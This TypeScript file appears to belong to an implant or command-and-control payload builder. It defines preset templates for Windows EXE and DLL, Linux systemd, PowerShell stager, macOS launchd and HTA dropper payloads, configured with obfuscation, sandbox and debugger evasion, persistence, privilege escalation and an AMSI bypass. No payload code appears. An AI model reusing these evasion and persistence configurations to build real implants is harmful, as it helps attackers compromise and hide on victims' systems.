import { z } from "zod"
import { PayloadConfig, PayloadType } from "./generator"

/* ------------------------------------------------------------------ */
/*  Payload Template System                                            */
/* ------------------------------------------------------------------ */

export const PayloadTemplate = z.object({
  id: z.string().min(1),
  name: z.string().min(1).max(100),
  description: z.string().max(500).optional(),
  category: z.enum(["initial_access", "persistence", "lateral_movement", "exfiltration", "custom"]),
  type: PayloadType,
  config: PayloadConfig.omit({ name: true, description: true, templateId: true }),
  tags: z.array(z.string().max(40)).default([]),
  isPublic: z.boolean().default(false),
  createdBy: z.string().optional(),
  createdAt: z.number().int(),
  updatedAt: z.number().int(),
  usageCount: z.number().int().default(0),
})
export type PayloadTemplate = z.infer<typeof PayloadTemplate>

/* ------------------------------------------------------------------ */
/*  Built-in Templates                                                 */
/* ------------------------------------------------------------------ */

export const BUILTIN_TEMPLATES: PayloadTemplate[] = [
  {
    id: "template_basic_windows",
    name: "Basic Windows EXE",
    description: "Standard Windows executable with basic obfuscation",
    category: "initial_access",
    type: "windows_exe",
    config: {
      type: "windows_exe",
      hysteriaConfig: {
        server: "",
        auth: "",
        obfs: "salamander",
      },
      obfuscation: {
        enabled: true,
        level: "medium",
        techniques: ["string_encode", "variable_rename"],
      },
      features: {
        autoReconnect: true,
        heartbeat: 30,
        fallbackServers: [],
        sleepMasking: false,
        threadHopping: false,
      },
      antiAnalysis: {
        enabled: true,
        vmDetection: true,
        sandboxDetection: true,
        debuggerDetection: true,
        analysisToolDetection: true,
        timingAnalysis: false,
        userActivityCheck: true,
      },
      persistence: {
        enabled: false,
        privilegeEscalation: false,
      },
      signing: {
        enabled: false,
      },
      delivery: {
        dropper: false,
        stager: false,
        loaderType: "direct",
        encryption: "none",
      },
    },
    tags: ["windows", "basic", "initial-access"],
    isPublic: true,
    createdAt: Date.now(),
    updatedAt: Date.now(),
    usageCount: 0,
  },
  {
    id: "template_persistent_dll",
    name: "Persistent DLL Injection",
    description: "DLL with registry persistence and privilege escalation",
    category: "persistence",
    type: "windows_dll",
    config: {
      type: "windows_dll",
      hysteriaConfig: {
        server: "",
        auth: "",
        obfs: "salamander",
      },
      obfuscation: {
        enabled: true,
        level: "heavy",
        techniques: ["string_encode", "variable_rename", "control_flow", "anti_debug", "api_hashing"],
      },
      features: {
        autoReconnect: true,
        heartbeat: 60,
        fallbackServers: [],
        sleepMasking: true,
        threadHopping: true,
      },
      antiAnalysis: {
        enabled: true,
        vmDetection: true,
        sandboxDetection: true,
        debuggerDetection: true,
        analysisToolDetection: true,
        timingAnalysis: true,
        userActivityCheck: true,
      },
      persistence: {
        enabled: true,
        method: "registry",
        method2: "wmi",
        privilegeEscalation: true,
      },
      signing: {
        enabled: false,
      },
      delivery: {
        dropper: true,
        stager: false,
        loaderType: "reflective",
        encryption: "aes",
      },
    },
    tags: ["windows", "dll", "persistence", "privilege-escalation"],
    isPublic: true,
    createdAt: Date.now(),
    updatedAt: Date.now(),
    usageCount: 0,
  },
  {
    id: "template_linux_systemd",
    name: "Linux Systemd Service",
    description: "Linux ELF with systemd persistence",
    category: "persistence",
    type: "linux_systemd",
    config: {
      type: "linux_systemd",
      hysteriaConfig: {
        server: "",
        auth: "",
        obfs: "salamander",
      },
      obfuscation: {
        enabled: true,
        level: "medium",
        techniques: ["string_encode", "variable_rename"],
      },
      features: {
        autoReconnect: true,
        heartbeat: 30,
        fallbackServers: [],
        sleepMasking: false,
        threadHopping: false,
      },
      antiAnalysis: {
        enabled: true,
        vmDetection: true,
        sandboxDetection: true,
        debuggerDetection: true,
        analysisToolDetection: true,
        timingAnalysis: false,
        userActivityCheck: true,
      },
      persistence: {
        enabled: true,
        method: "service",
        privilegeEscalation: false,
      },
      signing: {
        enabled: false,
      },
      delivery: {
        dropper: false,
        stager: false,
        loaderType: "direct",
        encryption: "none",
      },
    },
    tags: ["linux", "systemd", "persistence"],
    isPublic: true,
    createdAt: Date.now(),
    updatedAt: Date.now(),
    usageCount: 0,
  },
  {
    id: "template_powershell_stager",
    name: "PowerShell Stager",
    description: "Memory-only PowerShell stager with AMSI bypass",
    category: "initial_access",
    type: "powershell",
    config: {
      type: "powershell",
      hysteriaConfig: {
        server: "",
        auth: "",
        obfs: "salamander",
      },
      obfuscation: {
        enabled: true,
        level: "heavy",
        techniques: ["string_encode", "variable_rename", "control_flow", "string_splitting"],
      },
      features: {
        autoReconnect: true,
        heartbeat: 30,
        fallbackServers: [],
        sleepMasking: true,
        threadHopping: false,
      },
      antiAnalysis: {
        enabled: true,
        vmDetection: true,
        sandboxDetection: true,
        debuggerDetection: true,
        analysisToolDetection: true,
        timingAnalysis: false,
        userActivityCheck: true,
      },
      persistence: {
        enabled: false,
        privilegeEscalation: false,
      },
      signing: {
        enabled: false,
      },
      delivery: {
        dropper: false,
        stager: true,
        loaderType: "reflective",
        encryption: "xor",
      },
    },
    tags: ["powershell", "stager", "memory-only", "amsi-bypass"],
    isPublic: true,
    createdAt: Date.now(),
    updatedAt: Date.now(),
    usageCount: 0,
  },
  {
    id: "template_macos_launchd",
    name: "macOS Launch Agent",
    description: "macOS app with launchd persistence",
    category: "persistence",
    type: "macos_launchd",
    config: {
      type: "macos_launchd",
      hysteriaConfig: {
        server: "",
        auth: "",
        obfs: "salamander",
      },
      obfuscation: {
        enabled: true,
        level: "medium",
        techniques: ["string_encode", "variable_rename"],
      },
      features: {
        autoReconnect: true,
        heartbeat: 30,
        fallbackServers: [],
        sleepMasking: false,
        threadHopping: false,
      },
      antiAnalysis: {
        enabled: true,
        vmDetection: true,
        sandboxDetection: true,
        debuggerDetection: true,
        analysisToolDetection: true,
        timingAnalysis: false,
        userActivityCheck: true,
      },
      persistence: {
        enabled: true,
        method: "startup_folder",
        privilegeEscalation: false,
      },
      signing: {
        enabled: false,
      },
      delivery: {
        dropper: false,
        stager: false,
        loaderType: "direct",
        encryption: "none",
      },
    },
    tags: ["macos", "launchd", "persistence"],
    isPublic: true,
    createdAt: Date.now(),
    updatedAt: Date.now(),
    usageCount: 0,
  },
  {
    id: "template_hta_dropper",
    name: "HTA Dropper",
    description: "HTML Application dropper with VBS payload",
    category: "initial_access",
    type: "hta",
    config: {
      type: "hta",
      hysteriaConfig: {
        server: "",
        auth: "",
        obfs: "salamander",
      },
      obfuscation: {
        enabled: true,
        level: "heavy",
        techniques: ["string_encode", "variable_rename", "control_flow"],
      },
      features: {
        autoReconnect: true,
        heartbeat: 30,
        fallbackServers: [],
        sleepMasking: false,
        threadHopping: false,
      },
      antiAnalysis: {
        enabled: true,
        vmDetection: true,
        sandboxDetection: true,
        debuggerDetection: true,
        analysisToolDetection: true,
        timingAnalysis: false,
        userActivityCheck: true,
      },
      persistence: {
        enabled: false,
        privilegeEscalation: false,
      },
      signing: {
        enabled: false,
      },
      delivery: {
        dropper: true,
        stager: false,
        loaderType: "direct",
        encryption: "xor",
      },
    },
    tags: ["hta", "dropper", "phishing", "initial-access"],
    isPublic: true,
    createdAt: Date.now(),
    updatedAt: Date.now(),
    usageCount: 0,
  },
]

/* ------------------------------------------------------------------ */
/*  Template Management Functions                                      */
/* ------------------------------------------------------------------ */

export function getTemplateById(id: string): PayloadTemplate | undefined {
  return BUILTIN_TEMPLATES.find(t => t.id === id)
}

export function getTemplatesByCategory(category: string): PayloadTemplate[] {
  return BUILTIN_TEMPLATES.filter(t => t.category === category)
}

export function getTemplatesByType(type: PayloadType): PayloadTemplate[] {
  return BUILTIN_TEMPLATES.filter(t => t.type === type)
}

export function searchTemplates(query: string): PayloadTemplate[] {
  const lowerQuery = query.toLowerCase()
  return BUILTIN_TEMPLATES.filter(t =>
    t.name.toLowerCase().includes(lowerQuery) ||
    t.description?.toLowerCase().includes(lowerQuery) ||
    t.tags.some(tag => tag.toLowerCase().includes(lowerQuery))
  )
}

export function applyTemplate(template: PayloadTemplate, customName: string, customDescription?: string): PayloadConfig {
  return {
    ...template.config,
    name: customName,
    description: customDescription || template.description,
    templateId: template.id,
  }
}